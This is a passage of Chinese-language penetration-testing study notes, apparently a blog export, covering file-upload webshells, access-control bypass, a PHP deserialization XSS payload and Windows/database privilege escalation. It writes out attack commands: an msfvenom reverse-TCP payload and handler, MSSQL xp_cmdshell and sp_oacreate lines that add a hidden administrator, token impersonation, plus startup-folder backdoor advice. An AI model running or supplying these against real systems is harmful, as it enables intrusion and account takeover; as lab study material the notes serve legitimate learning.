<p>等都可以,这里可以看到成功上传了,尝试访问一下这个文件。(文件路径一般通过路径扫描可以知道把?)<br><img src="https://pic.imgdb.cn/item/652fd635c458853aef9b62a3.png" alt="图十五" title="图十五"></p>
<h3 id="getimagesize-验证"><a href="#getimagesize-验证" class="headerlink" title="getimagesize 验证"></a>getimagesize 验证</h3><p>这道题着重记录一下。<br>首先直接上传一个.php文件,发现<br><img src="https://pic.imgdb.cn/item/652fdb58c458853aefaf5a93.png" alt="图十六" title="图十六"><br>这里上网查了一下getimagesize()函数的作用。<br>getimagesize()：<a href="https://www.php.cn/faq/562666.html">https://www.php.cn/faq/562666.html</a><br>总的来说就是判断是否为图像类型,那么大小写,截断,重写等花里胡哨的方法失效。<br>只能上传图片马,先制作图片马。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">copy shana<span class="selector-class">.png</span> + <span class="number">2</span><span class="selector-class">.php</span> c.png<span class="comment">//c.png是合成后的图片名字</span></span><br></pre></td></tr></table></figure>
<p>直接上传这张图片。<br>此时虽然成功上传,但是网站没有发现有解析漏洞,所以不能被当成.php文件执行,那么活用思路,结合文件包含漏洞。<br><img src="https://pic.imgdb.cn/item/652fdc92c458853aefb43f64.png" alt="图十七" title="文件上传漏洞配合远程包含实现渗透"><br>由于这种思路是看了别人的writeup的,有启发,特别记录一下。</p>
<h2 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>登录lucy账户,随后在地址栏上修改即可,较简单。<br><img src="https://pic.imgdb.cn/item/65334930c458853aefc9aa39.png" alt="图十八"></p>
<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>先用超级用户登录,创建一个新的用户并抓包,放出去(目的是为了在http history留下记录)。<br>然后用普通用户登录,注意:登录时要抓包,复制个人的cookie信息。<br><img src="https://pic.imgdb.cn/item/653347b2c458853aefc50c33.png" alt="图十八" title="图十八"><br>然后把之前超级用户的数据包发送到重发器中去,把cookie换成刚才复制的,刷新界面,即可看到之前的数据又添加了一份,这里的数据可以在抓包工具里面改成自己想要的,这样就说明存在垂直越权漏洞。<br><img src="https://pic.imgdb.cn/item/653347b7c458853aefc51b88.png" alt="图十九" title="图十九"></p>
<h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>1、水平越权较好利用,只要你在登陆的时候看见网址栏存在和你用户名一样的值,就可以尝试修改(有时候是编号),这样可以达到在你的界面无需密码从而登录到别的用户的主页。<br>2、水平越权更多的是造成用户数据的隐私泄漏:而垂直越权是造成系统权限的泄漏,可能会使网站遭到破坏。<br>3、但是感觉垂直越权的实现和csrf一样难以实现,必须要借助管理员登陆过且操作过截获到的数据包才可操作。</p>
<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>上面两道题都是无类情况,该情况构造序列化payload的代码相对简单,接下来是学习有类情况下如何构造payload。<br>由于是本地靶场,那么我可以先查看源码。<br><img src="https://pic.imgdb.cn/item/6538773ec458853aefe880ac.jpg" alt="图九" title="代码审计"><br>发现存在一个class类,而且存在一个创建对象会触发的魔术方法,那么可以考虑利用,但是发现就算利用的上也没啥大用,总不能改别人代码吧。此路不通,那么往下看,发现一个判断,意思是如果是接收的是序列化的值,那么会转为对象并赋值给unser;如果不是序列化的值,没用。<br>而且,它的打印输出语句不是echo,那么就要考虑写js语句(觉得应该是如果简单输出字符串,那么就对获取信息没啥用,所以考虑可获取cookie的js语句)。<br>构造payload(编程,目的是把payload序列化):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123; <span class="comment">//创建一个类</span></span><br><span class="line">   <span class="keyword">var</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;<span class="comment">//赋初值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$whoami</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>();<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>;<span class="comment">//构造payload,获取cookie</span></span><br><span class="line"><span class="variable">$whoami</span>-&gt;test=<span class="variable">$payload</span>;<span class="comment">//传输payload</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$whoami</span>);<span class="comment">//输出序列化的内容</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>关于上述代码的注意点:<br>如果对方有类,那么你构造的代码必须也含有类(类名也要相同),然后创建一个对象传输你要传输的数据(我称之为一一对应)。<br>运行后,获取到序列化的payload:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65387749c458853aefe8a472.jpg" alt="图十" title="代码构造payload"><br>把这句payload放入文本框,并submit，成功弹出cookie信息。<br><img src="https://pic.imgdb.cn/item/65387753c458853aefe8caac.jpg" alt="图十一" title="成功弹出cookie"></p>
]]></content>
      <categories>
        <category>Recorder</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>权限提升|win|linux</title>
    <url>/2023/11/23/quanxiantisheng/</url>
    <content><![CDATA[<h1 id="权限提升-通过后台获取webshell-大纲"><a href="#权限提升-通过后台获取webshell-大纲" class="headerlink" title="权限提升|通过后台获取webshell|大纲"></a>权限提升|通过后台获取webshell|大纲</h1><p><img src="https://pic.imgdb.cn/item/6560667bc458853aef5476b4.webp"></p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p>1、对于一个网站，先找其是否使用了cms，使用了哪套cms，然后上网搜索如何拿shell；若是一些不知名的cms，我们可以下载下来，自己代码审计分析。<br>2、如果前期通过sql注入、备份源码下载登上了其网站的后台，如何提权？先看图片的思路点。再看功能点。通过后台进行权限提升，从而拿shell。<br>3、相关操作被拒绝无法实现的时候就会涉及权限提升。<br><code>具体有哪些权限需要我们知道和了解掌握的?</code><br>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等<br>（1）、后台权限: (获得方式:爆破，注入猜解，弱口令等获取的帐号营码配合登录)<br>一股网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件的。 (如后台功能存在文件操作的话也可以操作文件数据)<br>（2）、网站权限:(获得方式:以上图片三种思路获取)<br>查看或修改程序源代码，可以进行网站或应用的配置文件读取(接口配置信息，数据库配置信息等)，还能收集服务器操作系统相关的信息，为后续系统提权做准备,<br>（3）、数据库权限<br>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshe11)进行的据库配置文件读取获得。<br>（4）、接口权限:(邮件，短信，支付，第三方登录等)后台或网站权限后的获取途径:后台(修改配置信息功能点)，网站权限(查看的配置文件获取)，具体可以操作的事情自己想想</p>
<h1 id="对windows操作系统进行分析"><a href="#对windows操作系统进行分析" class="headerlink" title="对windows操作系统进行分析"></a>对windows操作系统进行分析</h1><h2 id="权限提升-win溢出漏洞-ps提权"><a href="#权限提升-win溢出漏洞-ps提权" class="headerlink" title="权限提升|win溢出漏洞|ps提权"></a>权限提升|win溢出漏洞|ps提权</h2><p><code>e部分来源</code>：<a href="https://www.yuque.com/weiker/xiaodi/oeu0k6l93qydx738#tYHDV">https://www.yuque.com/weiker/xiaodi/oeu0k6l93qydx738#tYHDV</a> </p>
<h3 id="必备知识点"><a href="#必备知识点" class="headerlink" title="必备知识点"></a>必备知识点</h3><p>1、对于windows，明确权限提升环境问题：web及本地<br>根据web进行提权：对方的服务器搭建有网站，我根据其网站权限获取到其服务器的权限，难度较大，不易成功（网站的权限一般都比较低，有些东西不易操作）；<br>根据本地进行提取：我获取其服务器计算机上某个普通用户的权限，想进一步获取管理员权限，较易成功。<br><code>web提权：已有网站权限（可以操作网站内容，但无法操作服务器），想要获得服务器权限，进而操作服务器。</code><br><code>本地提权：已有服务器普通用户权限，想要获得root权限--内网渗透比较多。</code><br><code>明确权限提升方法针对：针对方法适应问题</code><br>2、明确权限提升针对版本：个人（win7&#x2F;8&#x2F;9）及服务器版本（windows2012&#x2F;2016&#x2F;win xp）<br>3、权限认识|用户及用户组权限划分<br><code>0x00 windows权限认识(用户及用户组)</code><br>Windows系统内置了许多本地用户组，这些用户组本身都已经被赋予一些权限（permissions）,它们具有管理本地计算机或访问本地资源的权限。只要用户账户加入到这些本地组内，这些用户账户也将具备该组所拥有的权限。<br><code>0x01 普通权限</code><br>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)，身份验证用户组(Ahthenticated users)。其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。<br>管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）。再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置，不能运行一些涉及系统管理的程序。普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行涉及管理的程序等。来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。<br><code>0x02特殊权限</code><br>除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是:SYSTEM(系统)–最高权限、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者) 等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。<br>真正拥有“完全访问权”的只有一个成员:SYSTEM。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的。<br>“所有人”权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件，这也是一些程序正常运行需要的访问权限——任何人都能正常访问被赋予“Everyone”权限的文件，包括来宾组成员。<br>被标记为“创建者”权限的文件只有建立文件的那个用户才能访问，做到了一定程度的隐私保护。<br>但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。<br>无论是普通权限还是特殊权限，它们都可以“叠加”使用，“叠加”就是指多个权限共同使用，例如一个账户原本属于Users组，而后我们把他加入Administrators组再加入Trustedinstaller等权限提升，那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定身份访问的场合，用户只有为自己设置了指定的身份才能访问，这个时候“叠加”的使用就能减轻一部分劳动量了。<br><code>所以，我们说的提权，最好是提到SYSTEM，次之就是管理员组(Administrators)内某个成员</code><br><code>假设脚本是jsp，那么提到的webshell权限默认是system；而其他py，asp则是webshell权限</code></p>
<h3 id="具体分析-1"><a href="#具体分析-1" class="headerlink" title="具体分析"></a>具体分析</h3><p>1、通过后门获取到对方网站权限后，我们如何利用缓冲区溢出提权？（p59-15：00）<br>答：信息收集-补丁筛选（也即是查找哪些漏洞可以使用。Vulmap（适用于linux、kali自带），Wes，WindowsVulnScan）-利用MSF或特定EXP-执行-西瓜到手<br>以上工具的原理好像是先通过systeminfo导出系统的信息，然后利用此信息去对比，从而发现漏洞。<br>Vulmap，Wes，WindowsVulnScan三种方法对比：<br>vulmap: 缺点需要在powershell环境中执行，而对于webshell中是没有权限的，更适配Linux系统。我在物理机和虚拟机中都要运行都出现了各种各样的问题。<br>wes：优点能适应web环境只需要在webshell中执行cmd命令将信息导出到本地环境中执行即可<br>WindowsVulnScan：缺点：需要借助powershll也可以用systeminfo获取的信息安装工具的格式改成为json<br>2、利用MSF或特定EXP提权<br>利用上述3种方法之一找出可利用的漏洞之后，我们可以利用msf或者特定exp进行测试。<br>首选msf工具，但是msf工具是隔一段时间更新一版，因此msf中的漏洞可能更新不及时，如果遇到了msf没有收录的漏洞，我们可以网上搜索特定的exp测试，比如GitHub上有人整理了很多exp，可以搜索一下。<br><code>在实战中，由于攻击的服务器在外网，如果使用msf的话，会反弹一个shell，如果不在外网会收不到，所以建议整一台linux服务器，上面只装一个msf即可</code><br>MSF结合云服务器搭建组合拳？模拟上述操作实战演练？在实际环境中比较鸡肋因为涉及到阿里云的安全组端口开放问题<br>● 若要在实战中使用msf，最好买台服务器，不需要配置太好，2核4G即可，linux操作系统（Ubuntu更兼容），只安装msf，使用时用xshell连接即可。<br>● 云服务器上安装MSF环境：<a href="https://www.cnblogs.com/M0rta1s/p/11920903.html">https://www.cnblogs.com/M0rta1s/p/11920903.html</a><br>3、<code>总结</code><br>（1）.提权方法有部分适用在不同环境，当然也有通用方法（觉得关键语句是systeminfo，根据所处的环境选取漏洞筛选工具，筛选出漏洞后，利用上述所说的方法进行漏洞的利用）<br>（2）.提权方法也有操作系统版本区别，特性决定方法利用面（某些操作系统的版本可以直接上网搜索cve-exp，在本地运行即可直接获取system权限–前提：拥有一个普通用户的权限）<br>（3）.提权方法有部分需要特定环境，如数据库，第三方提权等（利用某些操作系统版本涉及的bug进行提权）</p>
<h2 id="权限提升-数据库权限提升-令牌窃取"><a href="#权限提升-数据库权限提升-令牌窃取" class="headerlink" title="权限提升|数据库权限提升|令牌窃取"></a>权限提升|数据库权限提升|令牌窃取</h2><p><code>关系数据库以及非关系数据库区别：</code><a href="https://blog.csdn.net/qq_51392112/article/details/131353186">https://blog.csdn.net/qq_51392112/article/details/131353186</a></p>
<h3 id="数据库提权-大纲"><a href="#数据库提权-大纲" class="headerlink" title="数据库提权|大纲"></a>数据库提权|大纲</h3><p><img src="https://pic.imgdb.cn/item/6563554bc458853aef9264c6.webp"><br><code>前言：</code><br>1、Web提权(webshell权限通过数据库提权提升至服务器权限)本地提权皆可，核心是得到数据库的账号密码<br>2、在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权。<br>3、数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码<br>4、除Access数据库外，其他数据库基本都存在数据库提权的可能<br><code>流程：</code>服务探针-信息收集-提权利用-获取权限</p>
<h3 id="数据库提权-具体分析"><a href="#数据库提权-具体分析" class="headerlink" title="数据库提权|具体分析"></a>数据库提权|具体分析</h3><p><code>数据库应用提权在权限提升中的意义</code><br>在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权<br><code>WEB或本地环境如何探针数据库应用</code><br>通过探针判断有数据库相关的服务<br>通过端口扫描看是否开启对应端口<br>通过命令段看是否开启相关服务<br>通过浏览文件或文件夹判定是否安装相关数据库<br><code>数据库提权权限用户密码收集等方法</code><br>配置文件、储存文件、暴力拆解、其他方式<br>配置文件：一些需要调用数据库的程序会有配置文件记录账号密码<br>储存文件：将数据库中的一些储存文件下载还原，解析里面的账号密码<br>暴力拆解：通过爆破脚本等爆破密码<br>一般是前两种，第一种最常见。从相关的配置文件中获得账号密码<br><code>目前数据库提权对应的技术及方法等</code><br>要进行分类，根据数据库的不同使用不同的方法</p>
<h4 id="对于mysql的数据库提权分析"><a href="#对于mysql的数据库提权分析" class="headerlink" title="对于mysql的数据库提权分析"></a>对于mysql的数据库提权分析</h4><p><code>1、服务探针</code><br>连接webshell，对目标服务器进行端口扫描，发现开放了3306端口，说明服务器部署了MySQL数据库。<br><code>2、信息收集</code><br>MySQL的最高权限的用户名为root，尝试获取root的密码。<br><code>方法1：读取网站数据库配置文件</code><br>这种方法的关键是了解其命名规则及查找技巧。可以重点查看带有关键字的配置文件，常见的关键字有sql、data、inc、config、conn、database、common、include等。<br><code>方法2：读取数据库存储或备份文件</code><br>首先，我们了解一下MySQL数据库存储格式及对应内容。<br>@@basedir&#x2F;data&#x2F;数据库名&#x2F;表名.myd，表名.myd文件中的内容对应的就是表的内容<br>相应地，mysql.user对应的内容就存储在MySQLr&#x2F;data&#x2F;mysql&#x2F;user.myd文件中<br><code>方法3：利用脚本暴力猜解</code><br>获取数据库最高权限密码，一般我们使用前两种方法居多，如果前两种方法实在用不了，我们才考虑使用暴力猜解。暴力猜解之前，需要先了解数据库是否支持外联以及如何开启外联(不支持外联就是只支持服务端本机连接)。<br>● 若数据库支持外联，可以远程本地暴力猜解；<br>● 若数据库不支持外联，可以服务器本地暴力猜解。<code>你不是已经获取到webshell权限了吗，那么就可以上传这个脚本文件，在服务器本地进行爆破（需要考虑本地脚本环境），PHP搭建的，就上传一个PHP爆破的脚本，再本地访问即可</code><br>但是，其实root账户一般是不支持外联的，所以没法使用工具进行本地暴力猜解，但是我们可以将脚本通过webshell上传到服务器，在服务器本地使用脚本暴力猜解。脚本可以从网上自行下载。<br><code>3、提权利用</code><br>法一：UDF提权，前提得知道数据库版本，核心是.dll文件（获取mysql控制权限：知道mysql用户名和密码，并且可以远程登录（即获取了mysql数据库的权限）<br>mysql具有写入文件的权限：mysql有写入文件的权限，即secure_file_priv的值为空。）。<br>法二：MOF法，不推荐。<br>法三：启动项提权。启动项提权,查看有哪些开机自动执行的脚本程序，把后门脚本添加到自启动。<br>C:\Users\admin(windows用户名)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br>可以利用msf，上传一个后门到上述路径处，然后若对面重启，那就会自动运行我们这个后门，那么就可以实现提权。<br>备注：问题是如何让我服务器重启，在一般的情况下服务器是不会轻易的重启的，要想重启就是做一些恶意的操作，ddos攻击和恶意脚本攻击。<br>法四：nc反弹shell<br>生成木马</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">命令行执行：msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.21.39 <span class="attribute">lport</span>=8888 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">在msf开启的命令(好像是)</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost 0.0.0.0</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport</span> 想要在哪个端口监听</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p>nc相关知识：<a href="https://www.cnblogs.com/-chenxs/p/11748488.html">https://www.cnblogs.com/-chenxs/p/11748488.html</a></p>
<h4 id="对mssql的数据库提权分析"><a href="#对mssql的数据库提权分析" class="headerlink" title="对mssql的数据库提权分析"></a>对mssql的数据库提权分析</h4><p><code>1、使用xp_cmdshell进行提权</code><br>&lt;1&gt;通过查看服务器配置文件得到sa账户密码为admin。<br>&lt;2&gt;由于mssql默认支持外联，因为可以本地通过SqlServer2008客户端使用sa账户密码连接。Navicat也能连接，但是推荐用官方的。<br>&lt;3&gt;启用xp_cmdshell。xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。</p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line">启用：</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span><span class="comment">;</span></span><br><span class="line">RECONFIGURE<span class="comment">;</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span><span class="comment">;</span></span><br><span class="line">RECONFIGURE<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>&lt;4&gt;接下来，我们就可以执行任意命令了。<br>EXEC master.dbo.xp_cmdshell ‘命令’;<br>&lt;5&gt;如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复<br>exex master.sys.sp_addextendedproc ‘xp_cmdshell’,’C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll’<br><code>xp_cmdshell在数据库-系统数据库-master-可编程性-扩展存储过程-系统扩展存储过程目录下。</code><br>总的来说就是通过前期获得的mssql数据库密码，通过软件进行连接，利用mssql自带的xp_cmdshell表执行命令，即可实现提权。<br><code>2、使用sp_oacreate进行提权</code><br>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。<br>&lt;1&gt;启用sp_oacreate</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">启用：</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> <span class="keyword">OVERRIDE</span>;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> <span class="keyword">OVERRIDE</span>;</span><br></pre></td></tr></table></figure>
<p>&lt;2&gt;执行命令</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">执行whoami查看权限：</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span> <span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output <span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;C:\\1.txt&#x27;</span></span><br><span class="line"> </span><br><span class="line">添加用户：</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span> <span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output <span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net user 123$ 123/add&#x27;</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span> <span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output <span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators 123$ /add&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>3、使用SqlServer沙盒提权</code><br>当前面两种都不得行，最终方案。<br>这个就是利用sql server上的沙盒模式。<br>具体看：<a href="https://blog.csdn.net/st3pby/article/details/128492244">https://blog.csdn.net/st3pby/article/details/128492244</a><br>照着操作就完事了<br>对于以上三种提权方式，我个人认为是你得现有一个普通用户权限，即本地提权。</p>
<h4 id="对Oracle数据库提权分析"><a href="#对Oracle数据库提权分析" class="headerlink" title="对Oracle数据库提权分析"></a>对Oracle数据库提权分析</h4><p>e，说是用工具，那就上网找一个教程跟着一步一步来吧。<br>1、普通用户模式：<br>前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。<br>2、DBA用户模式：<br>拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。<br>3、注入提升模式：<br>拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显<br><a href="https://blog.csdn.net/qq_61553520/article/details/130936733">https://blog.csdn.net/qq_61553520/article/details/130936733</a><br><code>安利</code><br>数据库提权姿势：<br><a href="https://blog.csdn.net/qq_63844103/article/details/128951265">https://blog.csdn.net/qq_63844103/article/details/128951265</a></p>
<h4 id="对Redis数据库权限提升分析"><a href="#对Redis数据库权限提升分析" class="headerlink" title="对Redis数据库权限提升分析"></a>对Redis数据库权限提升分析</h4><p>Redis服务因配置不当，可被攻击者恶意利用。黑客借助Redis内置命令，可将现有数据恶意清空；如果Redis以root身份运行，黑客可往服务器上写入SSH公钥文件，直接登录服务器。<br><code>连接</code><br>未授权漏洞或密码（备份文件|数据库配置文件去获得密码之类的）<br><code>提权</code><br>利用如下方法提权<br>参考：<a href="https://blog.csdn.net/fly_hps/article/details/80937837">https://blog.csdn.net/fly_hps/article/details/80937837</a><br>(1).利用计划任务执行命令反弹shell<br>(2).写ssh-keygen公钥然后使用私钥登陆<br><code>修复方案：</code><br>注意：以下操作，均需重启Redis后才能生效。<br>绑定需要访问数据库的IP（防止外联）。将127.0.0.1修改为需要访问此数据库的IP地址。<br>设置访问密码（防止未授权漏洞）。在Redis.conf中requirepass字段后，设置添加访问密码。<br>修改Redis服务运行账号。以较低权限账号运行Redis服务，禁用账号的登录权限。 </p>
<h4 id="对postgresql数据库权限提升分析"><a href="#对postgresql数据库权限提升分析" class="headerlink" title="对postgresql数据库权限提升分析"></a>对postgresql数据库权限提升分析</h4><p>1、直接exp<br>CVE-2018-1058：普通用户<br>CVE-2019-9193：高权限<br><code>熟知各种数据库最高权限的用户名</code></p>
<h4 id="Windowas2008令牌窃取权限提升"><a href="#Windowas2008令牌窃取权限提升" class="headerlink" title="Windowas2008令牌窃取权限提升"></a>Windowas2008令牌窃取权限提升</h4><p>（本身具有一定权限-即非webshell权限，是主机的某一个用户的权限）<br>1、进行远程过程调用时请求提升权限，然后调用它从而生成特权安全今牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。<br>2、本地提权实验:获取会话-利用模块-窃取令牌-提权<br>3、其实就是本地提权，就是得到了对方主机的本机权限之后，此权限不是administrator&#x2F;system，利用这个令牌窃取，把用户权限提升到高权限。<br><code>针对win2008之前的os</code></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> incognito <span class="comment">#进入incognito模块</span></span><br><span class="line">list_tokens -u <span class="comment">#列出令牌</span></span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> </span><br></pre></td></tr></table></figure>
<p><code>这个还可以，后期配合其他的提权方法可以直接提到stystem</code></p>
<h4 id="windows2003-10进程注入提升"><a href="#windows2003-10进程注入提升" class="headerlink" title="windows2003&amp;10进程注入提升"></a>windows2003&amp;10进程注入提升</h4><p>进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用在windows2008之前操作系统上所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统</p>
<h2 id="权限提升-烂土豆-dll劫持-引号路径-服务权限"><a href="#权限提升-烂土豆-dll劫持-引号路径-服务权限" class="headerlink" title="权限提升|烂土豆|dll劫持|引号路径|服务权限"></a>权限提升|烂土豆|dll劫持|引号路径|服务权限</h2><h3 id="权限提升-大纲-完整"><a href="#权限提升-大纲-完整" class="headerlink" title="权限提升|大纲|完整"></a>权限提升|大纲|完整</h3><p><img src="https://pic.imgdb.cn/item/656855b8c458853aef03b63c.webp"></p>
<h3 id="具体分析-2"><a href="#具体分析-2" class="headerlink" title="具体分析"></a>具体分析</h3><h4 id="烂土豆提权-web"><a href="#烂土豆提权-web" class="headerlink" title="烂土豆提权-web"></a>烂土豆提权-web</h4><p><code>1、RottenPotato(烂土豆)提权的原理简述如下：</code><br>1.欺骗“NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。<br>2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。<br>3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。<br>总结：一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。<br><code>2、烂土豆比热土豆的优点是：</code><br>1.100%可靠<br>2.（当时）全版本通杀<br>3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用<br>总之，烂土豆是通过中间人攻击，将COM(NT\SYSTEM权限)在第二步挑战应答过程中认证的区块改为自己的区块获取SYSTEM权限，然后利用msf的模仿令牌功能模仿SYSTEM令牌。<br><code>3、关于烂土豆的必备知识点</code><br><code>令牌窃取配合烂土豆提权可以直接从web权限提升至system权限</code><br>单纯令牌窃取：本地提权<br>如配合烂土豆提权：有Web或数据库等权限（才可以通过webshell-&gt;system，进行烂土豆提权）<br><code>即令牌窃取需要一定本地权限，只有webshell权限不可以提权至system。但是配合烂土豆可以实现</code><br><code>过程：</code>上传msf产生的后门-开启监听-上传烂土豆-执行烂土豆-利用窃取模块（令牌窃取）-窃取SYSTEM-成功</p>
